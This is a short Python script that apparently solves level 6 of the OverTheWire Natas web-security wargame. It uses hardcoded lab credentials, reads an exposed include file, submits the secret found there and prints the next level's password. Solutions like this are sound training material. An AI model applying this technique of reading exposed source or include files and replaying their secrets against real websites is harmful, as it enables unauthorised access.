import requests

url1 = 'http://natas6.natas.labs.overthewire.org/'
url2 = 'http://natas6.natas.labs.overthewire.org/index-source.html'
url3 = 'http://natas6.natas.labs.overthewire.org/includes/secret.inc'
user = 'natas6'
passwd = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
data = {'secret':'FOEIUWGHFEEUHOFUOIU',
		'submit':'Submit Query'}
r1 = requests.get(url1,auth=(user, passwd))
print r1.text
print '='*80
r3 = requests.get(url3,auth=(user, passwd))
print r3.text
print '='*80
r1 = requests.post(url1,data=data,auth=(user,passwd))
a = r1.text
for i in a.splitlines():
	if "natas7" in i:
		print i